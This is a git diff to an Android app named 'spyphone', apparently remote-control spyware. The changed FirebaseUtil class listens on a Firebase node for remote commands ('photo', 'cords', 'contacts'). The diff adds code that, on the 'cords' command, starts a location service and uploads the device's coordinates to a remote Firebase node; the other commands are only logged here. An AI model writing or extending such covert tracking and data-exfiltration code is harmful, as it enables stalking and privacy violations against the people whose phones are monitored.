@@ -1,6 +1,11 @@
 package emit.esy.es.spyphone.util;
 
 import android.content.Context;
+import android.content.Intent;
+import android.os.Bundle;
+import android.os.Handler;
+import android.os.Message;
+import android.os.Messenger;
 import android.util.Log;
 
 import com.firebase.client.AuthData;
@@ -13,6 +18,7 @@ import java.util.HashMap;
 import java.util.Map;
 
 import emit.esy.es.spyphone.R;
+import emit.esy.es.spyphone.services.LocationService;
 
 /**
  * Created by Emil Makovac on 24/04/2015.
@@ -29,6 +35,27 @@ public class FirebaseUtil {
         this.context = context;
         this.username = username;
         this.password = password;
+    }
+
+    private void createUser() {
+        ref.createUser(username, password, new Firebase.ValueResultHandler<Map<String, Object>>() {
+
+            @Override
+            public void onSuccess(Map<String, Object> result) {
+                Log.d(LOG_TAG, "CreateUser SUCCESS");
+                Log.d(LOG_TAG, "CreateUser ID- " + result.get("uid").toString());
+                id= result.get("uid").toString();
+                setOnline(id, false);
+                //authenticate user
+                authenticateUser();
+
+            }
+
+            @Override
+            public void onError(FirebaseError firebaseError) {
+                Log.d(LOG_TAG, "CreateUser ERROR");
+            }
+        });
     }
 
     public void authenticateUser() {
@@ -53,6 +80,38 @@ public class FirebaseUtil {
             }
         });
 
+    }
+
+    Handler handler = new Handler() {
+        @Override
+        public void handleMessage(Message msg) {
+
+            // do whatever with the bundle here
+            uploadToFirebase(msg.getData());
+        }
+    };
+
+    private void uploadToFirebase(Bundle data) {
+        Log.d(LOG_TAG,"uploadToFirebase");
+        // get the firebase androidWrite ref
+        Firebase uploadRef = getUploadRef();
+        // set value for action (bundle get action)
+        String action = data.getString("action");
+        Object content = new Object();
+        Map<String, Object> aw = new HashMap<>();
+        aw.put("action", action);
+        //set value for content (switch case for content return value)
+        switch(action){
+            case "cords":
+                content = data.getDoubleArray("content");
+                break;
+        }
+        aw.put("content", content);
+        uploadRef.setValue(aw);
+    }
+
+    private Firebase getUploadRef() {
+        return userRef.child("androidWrite");
     }
 
     public void setUpChildRef() {
@@ -81,15 +140,20 @@ public class FirebaseUtil {
                     if(child.equals("androidRead")){
                         //check if androidRead has a string or a map of strings as a value
                         try{
+                            Intent intent;
                             //if is a string
                             String childValue = (String)dataSnapshot.getValue();
                             switch (childValue){
                                 case "photo":
                                     Log.d(LOG_TAG, "Starting photo service");
+
                                     setOnDefaultAndroidRead(dataSnapshot);
                                     break;
                                 case "cords":
                                     Log.d(LOG_TAG, "Starting geo service");
+                                    intent = new Intent(context, LocationService.class);
+                                    intent.putExtra("messenger", new Messenger(handler));
+                                    context.startService(intent);
                                     setOnDefaultAndroidRead(dataSnapshot);
                                     break;
                                 case "contacts":
@@ -101,7 +165,7 @@ public class FirebaseUtil {
                                     break;
                             }
                         } catch (Exception e){
-                            //if is a map of strings
+                            //if is a map
                             Map<String, Object> childValue;
                             childValue = (Map<String, Object>) dataSnapshot.getValue();
                             String action = childValue.get("action").toString();
@@ -143,27 +207,6 @@ public class FirebaseUtil {
     private void setOnDefaultAndroidRead(DataSnapshot dataSnapshot) {
         Log.d(LOG_TAG, "androidRead set to null");
         dataSnapshot.getRef().setValue("null");
-    }
-
-    private void createUser() {
-        ref.createUser(username, password, new Firebase.ValueResultHandler<Map<String, Object>>() {
-
-            @Override
-            public void onSuccess(Map<String, Object> result) {
-                Log.d(LOG_TAG, "CreateUser SUCCESS");
-                Log.d(LOG_TAG, "CreateUser ID- " + result.get("uid").toString());
-                id= result.get("uid").toString();
-                setOnline(id, false);
-                //authenticate user
-                authenticateUser();
-
-            }
-
-            @Override
-            public void onError(FirebaseError firebaseError) {
-                Log.d(LOG_TAG, "CreateUser ERROR");
-            }
-        });
     }
 
     private void setOnline(String id, boolean b) {
